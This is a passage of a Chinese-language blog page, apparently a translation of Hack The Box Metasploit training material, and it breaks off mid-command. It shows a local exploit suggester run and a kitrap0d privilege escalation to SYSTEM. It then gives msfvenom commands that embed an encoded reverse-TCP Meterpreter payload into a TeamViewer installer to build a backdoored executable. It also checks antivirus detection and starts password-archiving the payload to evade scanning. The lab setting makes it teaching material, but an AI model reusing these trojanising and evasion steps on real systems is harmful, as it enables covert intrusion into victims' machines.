class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search local exploit suggester</span><br><span class="line"></span><br><span class="line">&lt;...SNIP...&gt;</span><br><span class="line">   2375  post/multi/manage/screenshare                                                              normal     No     Multi Manage the screen of the target meterpreter session</span><br><span class="line">   2376  post/multi/recon/local_exploit_suggester                                                   normal     No     Multi Recon Local Exploit Suggester</span><br><span class="line">   2377  post/osx/gather/apfs_encrypted_volume_passwd                              2018-03-21       normal     Yes    Mac OS X APFS Encrypted Volume Password Disclosure</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; use 2376</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/recon/local_exploit_suggester):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   SESSION                           yes       The session to run this module on</span><br><span class="line">   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; set session 2</span><br><span class="line"></span><br><span class="line">session =&gt; 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.5 - Collecting local exploits for x86/windows...</span><br><span class="line">[*] 10.10.10.5 - 31 exploit checks are being tried...</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.</span><br><span class="line">[*] Post module execution completed</span><br></pre></td></tr></table></figure><p>将这些结果摆在我们面前，我们可以轻松地选择其中一个进行测试。如果我们选择的一个最终无效，请继续进行下一个。并非所有检查都是 100% 准确的，并非所有变量都相同。往下看，<code>bypassauc_eventvwr</code>失败是因为 IIS 用户不是管理员组的一部分，这是默认和预期的。第二个选项<code>ms10_015_kitrap0d</code>可以解决问题。</p><h4 id="MSF-本地权限提升"><a href="#MSF-本地权限提升" class="headerlink" title="MSF - 本地权限提升"></a>MSF - 本地权限提升</h4><p> MSF - 本地权限提升</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; search kitrap0d</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                     Disclosure Date  Rank   Check  Description</span><br><span class="line">   -  ----                                     ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great  Yes    Windows SYSTEM Escalation via KiTrap0D</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; use 0</span><br><span class="line">msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/ms10_015_kitrap0d):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION  2                yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     tun0             yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     1338             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; set LPORT 1338</span><br><span class="line"></span><br><span class="line">LPORT =&gt; 1338</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; set SESSION 3</span><br><span class="line"></span><br><span class="line">SESSION =&gt; 3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.5:1338 </span><br><span class="line">[*] Launching notepad to host the exploit...</span><br><span class="line">[+] Process 3552 launched.</span><br><span class="line">[*] Reflectively injecting the exploit DLL into 3552...</span><br><span class="line">[*] Injecting exploit into 3552 ...</span><br><span class="line">[*] Exploit injected. Injecting payload into 3552...</span><br><span class="line">[*] Payload injected. Executing exploit...</span><br><span class="line">[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.</span><br><span class="line">[*] Sending stage (176195 bytes) to 10.10.10.5</span><br><span class="line">[*] Meterpreter session 4 opened (10.10.14.5:1338 -&gt; 10.10.10.5:49162) at 2020-08-28 17:15:56 +0000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><h1 id="防火墙和-IDS-IPS-规避"><a href="#防火墙和-IDS-IPS-规避" class="headerlink" title="防火墙和 IDS&#x2F;IPS 规避"></a>防火墙和 IDS&#x2F;IPS 规避</h1><hr><p>为了更好地了解我们如何高效、安静地攻击目标，我们首先需要更好地了解该目标是如何防御的。我们介绍了两个新术语：</p><ul><li>端点保护</li><li>周界保护</li></ul><hr><h2 id="端点保护"><a href="#端点保护" class="headerlink" title="端点保护"></a>端点保护</h2><p><code>Endpoint protection</code>指任何本地化设备或服务，其唯一目的是保护网络上的单个主机。主机可以是个人计算机、公司工作站或网络非军事区 (De-Militarized Zone <code>DMZ</code>) 中的服务器。</p><p>端点保护通常以软件包的形式出现，其中包括<code>Antivirus Protection</code>, <code>Antimalware Protection</code>（这包括英国媒体报道软件、间谍软件、广告软件、恐吓软件、勒索软件），<code>Firewall</code>以及<code>Anti-DDOS</code>所有这些都在同一个软件包中。我们比后者更熟悉这种形式，因为我们大多数人都在家里的 PC 或工作场所的工作站上运行端点保护软件。Avast、Nod32、Malwarebytes 和 BitDefender 只是一些当前名称。</p><hr><h4 id="周界保护"><a href="#周界保护" class="headerlink" title="周界保护"></a>周界保护</h4><p><code>Perimeter protection</code>通常出现在网络外围边缘的物理或虚拟设备中。它们<code>edge devices</code>本身提供<code>inside</code>从 的网络访问<code>outside</code>，换句话说，从<code>public</code>到<code>private</code>。</p><p>在这两个区域之间，在某些情况下，我们还会发现第三个区域，称为非军事区 (De-Militarized Zone <code>DMZ</code>)，如前所述。这是一个<code>lower-security policy level</code>比一个地带<code>inside networks&#39;</code>，但比一个更高的<code>trust level</code>地带<code>outside zone</code>，这就是浩瀚的互联网。这是面向公众的服务器所在的虚拟空间，它们从 Internet 为公共客户端推送和拉取数据，但也从内部进行管理，并使用补丁、信息和其他数据进行更新，以使所服务的信息保持最新和满足服务器的客户。</p><hr><h2 id="安全政策"><a href="#安全政策" class="headerlink" title="安全政策"></a>安全政策</h2><p>安全策略是任何网络维护良好的安全状态背后的驱动力。它们的功能与 ACL（访问控制列表）对熟悉 Cisco CCNA 教育材料的任何人的作用相同。它们本质上是一个列表<code>allow</code>和<code>deny</code>语句，指示流量或文件如何存在于网络边界内。多个列表可以作用于多个网络部分，允许配置中的灵活性。这些列表还可以针对网络和主机的不同功能，具体取决于它们所在的位置：</p><ul><li>网络流量策略</li><li>申请政策</li><li>用户访问控制策略</li><li>文件管理政策</li><li>DDoS 保护策略</li><li>其他的</li></ul><p>虽然并非上述所有这些类别都带有“安全策略”一词，但围绕它们的所有安全机制都基于相同的基本原则运行，即和<code>allow</code>条目<code>deny</code>。唯一的区别是它们引用和应用的对象目标。所以问题仍然存在，我们如何将网络中的事件与这些规则匹配，以便可以采取前面提到的行动？</p><p>有多种方法可以将事件或对象与安全策略条目相匹配：</p><table><thead><tr><th><strong>安全政策</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>Signature-based Detection</code></td><td>数据包在网络中的操作以及与称为签名的预建和预定攻击模式的比较。与这些签名的任何 100% 匹配都会产生警报。</td></tr><tr><td><code>Heuristic / Statistical Anomaly Detection</code></td><td>与既定基线的行为比较包括已知 APT（高级持续威胁）的作案手法签名。基线将确定网络的规范以及常用的协议。任何与最大阈值的偏差都会产生警报。</td></tr><tr><td><code>Stateful Protocol Analysis Detection</code></td><td>使用普遍接受的非恶意活动定义的预建配置文件，通过事件比较来识别协议的差异。</td></tr><tr><td><code>Live-monitoring and Alerting (SOC-based)</code></td><td>专用、内部或租用的 SOC（安全运营中心）中的一组分析师使用实时馈送软件来监控网络活动和中间警报系统以发现任何潜在威胁，自行决定是否应对威胁采取行动或让自动化机制会采取行动。</td></tr></tbody></table><hr><h2 id="规避技术"><a href="#规避技术" class="headerlink" title="规避技术"></a>规避技术</h2><p>现在大多数基于主机的防病毒软件主要依赖于<code>Signature-based Detection</code>识别软件样本中存在的恶意代码的各个方面。这些签名放置在防病毒引擎内，随后用于扫描存储空间和正在运行的进程以查找任何匹配项。当一个未知软件登陆分区并被防病毒软件匹配时，大多数防病毒软件会隔离恶意程序并杀死正在运行的进程。</p><p>我们如何避开所有这些热量？我们和它一起玩。本节中显示的示例<code>Encoders</code>表明，对于所有 AV 产品，仅使用不同的编码方案和多次迭代对有效载荷进行编码是不够的。此外，仅在攻击者和受害者之间建立一个通信通道就可以用现有的 IDS&#x2F;IPS 产品的当前功能发出一些警报。</p><p>然而，随着 MSF6 版本的发布，msfconsole 可以将 AES 加密的通信从任何 Meterpreter shell 隧道传输回攻击者主机，从而在有效负载发送到受害主机时成功加密流量。这主要用于处理基于网络的 IDS&#x2F;IPS。在极少数情况下，我们可能会遇到非常严格的流量规则集，这些规则集会根据发件人的 IP 地址标记我们的连接。避免这种情况的唯一方法是找到允许通过的服务。一个很好的例子就是 2017 年的 Equifax 黑客攻击，恶意黑客滥用 Apache Struts 漏洞访问关键数据服务器网络。DNS 渗漏技术用于缓慢地将数据从网络中吸出并进入黑客的域，几个月都不会被注意到。要了解有关此攻击的更多信息，请访问以下链接：</p><ul><li><a href="https://www.zdnet.com/article/us-government-releases-post-mortem-report-on-equifax-hack/">美国政府关于 Equifax 黑客攻击的事后分析报告</a></li><li><a href="https://www.darkreading.com/risk/tips-to-protect-the-dns-from-data-exfiltration/a/d-id/1330411">防止 DNS 渗漏</a></li><li><a href="https://www.infoblox.com/wp-content/uploads/infoblox-whitepaper-stopping-data-exfiltration-and-malware-spread-through-dns.pdf">阻止数据泄露和恶意软件通过 DNS 传播</a></li></ul><p>回到 msfconsole，它现在支持 AES 加密隧道的能力，加上 Meterpreter 在内存中运行的特性，大大提高了我们的能力。然而，我们仍然有一个问题，即有效载荷一旦到达目的地，在运行并放入内存之前会发生什么。可以对该文件的签名进行指纹识别，与数据库进行匹配，并阻止我们访问目标的机会。我们还可以确定，AV 软件开发人员正在研究 msfconsole 模块和功能，以将生成的代码和文件添加到他们的签名数据库中，从而导致大多数（如果不是全部）默认有效负载立即被 AV 软件关闭。</p><p>我们很幸运，因为<code>msfvenom</code>提供了使用可执行模板的选项。这允许我们为可执行文件使用一些预设模板，将我们的有效载荷注入其中（没有双关语意），并使用<code>any</code>可执行文件作为我们可以发起攻击的平台。我们可以将 shellcode 嵌入到我们手边的任何安装程序、软件包或程序中，将有效负载 shellcode 隐藏在实际产品的合法代码深处。这极大地混淆了我们的恶意代码，更重要的是，降低了我们被检测到的机会。实际的、合法的可执行文件、我们不同的编码方案（及其迭代）和我们不同的有效负载 shellcode 变体之间有许多有效组合。这会生成所谓的后门可执行文件。</p><p>查看下面的代码片段，了解 msfvenom 如何将有效载荷嵌入到任何可执行文件中：</p><p> 周界保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5</span><br><span class="line"></span><br><span class="line">Attempting to read payload from STDIN...</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 5 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 27 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 54 (iteration=1)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 81 (iteration=2)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 108 (iteration=3)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 135 (iteration=4)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 135</span><br><span class="line">Payload size: 135 bytes</span><br><span class="line">Saved as: /home/user/Desktop/TeamViewer_Setup.exe</span><br></pre></td></tr></table></figure><p> 周界保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls</span><br><span class="line"></span><br><span class="line">Pictures-of-cats.tar.gz  TeamViewer_Setup.exe  Cake_recipes</span><br></pre></td></tr></table></figure><p>大多数情况下，当目标启动后门可执行文件时，似乎什么也不会发生，这在某些情况下会引起怀疑。为了提高我们的机会，我们需要触发已启动应用程序的正常执行的继续，同时将有效负载从主应用程序拉到一个单独的线程中。我们使用<code>-k</code>上面显示的标志来执行此操作。然而，即使<code>-k</code>标志正在运行，如果目标从 CLI 环境启动后门可执行模板，他们只会注意到正在运行的后门。如果他们这样做，将弹出一个单独的窗口，其中包含有效载荷，直到我们在目标上完成运行有效载荷会话交互后，该窗口才会关闭。</p><hr><h2 id="档案"><a href="#档案" class="headerlink" title="档案"></a>档案</h2><p>存档文件、文件夹、脚本、可执行文件、图片或文档等信息并在存档上放置密码可绕过当今许多常见的反病毒签名。但是，此过程的缺点是它们将作为通知在 AV 警报仪表板中提出，因为由于被密码锁定而无法扫描。管理员可以选择手动检查这些档案以确定它们是否是恶意的。</p><h4 id="生成有效载荷-1"><a href="#生成有效载荷-1" class="headerlink" title="生成有效载荷"></a>生成有效载荷</h4><p> 生成有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5</span><br><span class="line"></span><br><span class="line">Attempting to read payload from STDIN...</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 5 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 27 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 54 (iteration=1)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 81 (iteration=2)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 108 (iteration=3)</span><br><span class="line">x86/shikata_ga_nai succeeded with size 135 (iteration=4)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 135</span><br><span class="line">Payload size: 135 bytes</span><br><span class="line">Saved as: /home/user/test.js</span><br></pre></td></tr></table></figure><p> 生成有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ cat test.js</span><br><span class="line"></span><br><span class="line">�+n&quot;����t$�G4ɱ1zz��j�V6����ic��o�Bs&gt;��Z*�����9vt��%��1�</span><br><span class="line">&lt;...SNIP...&gt;</span><br><span class="line">�Qa*���޴��RW�%Š.\�=;.l�T���XF���T��</span><br></pre></td></tr></table></figure><p>如果我们检查 VirusTotal 以从我们生成的有效负载中获取检测基线，结果将如下所示。</p><h4 id="病毒总数"><a href="#病毒总数" class="headerlink" title="病毒总数"></a>病毒总数</h4><p> 病毒总数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msf-virustotal -k &lt;API key&gt; -f test.js </span><br><span class="line"></span><br><span class="line">[*] WARNING: When you upload or otherwise submit content, you give VirusTotal</span><br><span class="line">[*] (and those we work with) a worldwide, royalty free, irrevocable and transferable</span><br><span class="line">[*] licence to use, edit, host, store, reproduce, modify, create derivative works,</span><br><span class="line">[*] communicate, publish, publicly perform, publicly display and distribute such</span><br><span class="line">[*] content. To read the complete Terms of Service for VirusTotal, please go to the</span><br><span class="line">[*] following link:</span><br><span class="line">[*] https://www.virustotal.com/en/about/terms-of-service/</span><br><span class="line">[*] </span><br><span class="line">[*] If you prefer your own API key, you may obtain one at VirusTotal.</span><br><span class="line"></span><br><span class="line">[*] Enter &#x27;Y&#x27; to acknowledge: Y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Using API key: &lt;API key&gt;</span><br><span class="line">[*] Please wait while I upload test.js...</span><br><span class="line">[*] VirusTotal: Scan request successfully queued, come back later for the report</span><br><span class="line">[*] Sample MD5 hash    : 35e7687f0793dc3e048d557feeaf615a</span><br><span class="line">[*] Sample SHA1 hash   : f2f1c4051d8e71df0741b40e4d91622c4fd27309</span><br><span class="line">[*] Sample SHA256 hash : 08799c1b83de42ed43d86247ebb21cca95b100f6a45644e99b339422b7b44105</span><br><span class="line">[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection/f-&lt;SNIP&gt;-1652167047</span><br><span class="line">[*] Requesting the report...</span><br><span class="line">[*] Received code 0. Waiting for another 60 seconds...</span><br><span class="line">[*] Analysis Report: test.js (11 / 59): &lt;...SNIP...&gt;</span><br><span class="line">====================================================================================================</span><br><span class="line"></span><br><span class="line"> Antivirus             Detected  Version               Result                             Update</span><br><span class="line"> ---------             --------  -------               ------                             ------</span><br><span class="line"> ALYac                 true      1.1.3.1               Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> AVG                   true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510</span><br><span class="line"> Acronis               false     1.2.0.108                                                20220426</span><br><span class="line"> Ad-Aware              true      3.0.21.193            Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> AhnLab-V3             false     3.21.3.10230                                             20220510</span><br><span class="line"> Antiy-AVL             false     3.0                                                      20220510</span><br><span class="line"> Arcabit               false     1.0.0.889                                                20220510</span><br><span class="line"> Avast                 true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510</span><br><span class="line"> Avira                 false     8.3.3.14                                                 20220510</span><br><span class="line"> Baidu                 false     1.0.0.2                                                  20190318</span><br><span class="line"> BitDefender           true      7.2                   Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> BitDefenderTheta      false     7.2.37796.0                                              20220428</span><br><span class="line"> Bkav                  false     1.3.0.9899                                               20220509</span><br><span class="line"> CAT-QuickHeal         false     14.00                                                    20220510</span><br><span class="line"> CMC                   false     2.10.2019.1                                              20211026</span><br><span class="line"> ClamAV                true      0.105.0.0             Win.Trojan.MSShellcode-6360729-0   20220509</span><br><span class="line"> Comodo                false     34607                                                    20220510</span><br><span class="line"> Cynet                 false     4.0.0.27                                                 20220510</span><br><span class="line"> Cyren                 false     6.5.1.2                                                  20220510</span><br><span class="line"> DrWeb                 false     7.0.56.4040                                              20220510</span><br><span class="line"> ESET-NOD32            false     25243                                                    20220510</span><br><span class="line"> Emsisoft              true      2021.5.0.7597         Exploit.Metacoder.Shikata.Gen (B)  20220510</span><br><span class="line"> F-Secure              false     18.10.978.51                                             20220510</span><br><span class="line"> FireEye               true      35.24.1.0             Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> Fortinet              false     6.2.142.0                                                20220510</span><br><span class="line"> GData                 true      A:25.33002B:27.27300  Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> Gridinsoft            false     1.0.77.174                                               20220510</span><br><span class="line"> Ikarus                false     6.0.24.0                                                 20220509</span><br><span class="line"> Jiangmin              false     16.0.100                                                 20220509</span><br><span class="line"> K7AntiVirus           false     12.12.42275                                              20220510</span><br><span class="line"> K7GW                  false     12.12.42275                                              20220510</span><br><span class="line"> Kaspersky             false     21.0.1.45                                                20220510</span><br><span class="line"> Kingsoft              false     2017.9.26.565                                            20220510</span><br><span class="line"> Lionic                false     7.5                                                      20220510</span><br><span class="line"> MAX                   true      2019.9.16.1           malware (ai score=89)              20220510</span><br><span class="line"> Malwarebytes          false     4.2.2.27                                                 20220510</span><br><span class="line"> MaxSecure             false     1.0.0.1                                                  20220510</span><br><span class="line"> McAfee                false     6.0.6.653                                                20220510</span><br><span class="line"> McAfee-GW-Edition     false     v2019.1.2+3728                                           20220510</span><br><span class="line"> MicroWorld-eScan      true      14.0.409.0            Exploit.Metacoder.Shikata.Gen      20220510</span><br><span class="line"> Microsoft             false     1.1.19200.5                                              20220510</span><br><span class="line"> NANO-Antivirus        false     1.0.146.25588                                            20220510</span><br><span class="line"> Panda                 false     4.6.4.2                                                  20220509</span><br><span class="line"> Rising                false     25.0.0.27                                                20220510</span><br><span class="line"> SUPERAntiSpyware      false     5.6.0.1032                                               20220507</span><br><span class="line"> Sangfor               false     2.14.0.0                                                 20220507</span><br><span class="line"> Sophos                false     1.4.1.0                                                  20220510</span><br><span class="line"> Symantec              false     1.17.0.0                                                 20220510</span><br><span class="line"> TACHYON               false     2022-05-10.02                                            20220510</span><br><span class="line"> Tencent               false     1.0.0.1                                                  20220510</span><br><span class="line"> TrendMicro            false     11.0.0.1006                                              20220510</span><br><span class="line"> TrendMicro-HouseCall  false     10.0.0.1040                                              20220510</span><br><span class="line"> VBA32                 false     5.0.0                                                    20220506</span><br><span class="line"> ViRobot               false     2014.3.20.0                                              20220510</span><br><span class="line"> VirIT                 false     9.5.191                                                  20220509</span><br><span class="line"> Yandex                false     5.5.2.24                                                 20220428</span><br><span class="line"> Zillya                false     2.0.0.4627                                               20220509</span><br><span class="line"> ZoneAlarm             false     1.0                                                      20220510</span><br><span class="line"> Zoner                 false     2.2.2.0                                                  20220509</span><br></pre></td></tr></table></figure><p>现在，尝试将其存档两次，在创建时为两个存档都设置密码，并从它们的名称中删除<code>.rar</code>&#x2F; <code>.zip</code>&#x2F;<code>.7z</code>扩展名。为此，我们可以从 RARLabs 安装<a href="https://www.rarlab.com/download.htm">RAR 实用程序</a>，它的工作方式与 Windows 上的 WinRAR 完全一样。</p><h4 id="存档有效负载"><a href="#存档有效负载" class="headerlink" title="存档有效负载"></a>存档有效负载</h4><p> 存档有效负载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz</span><br><span class="line">vnswer77@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz &amp;&amp; cd rar</span><br><span class="line">vnswer77@htb[/htb]$ rar a ~/test.rar -p ~/test.js</span><br><span class="line"></span><br><span class="line">Enter password (will not be echoed): ******</span><br><span class="line">Reenter password: ******</span><br><span class="line"></span><br><span class="line">RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017</span><br><span class="line">Trial version             Type &#x27;rar 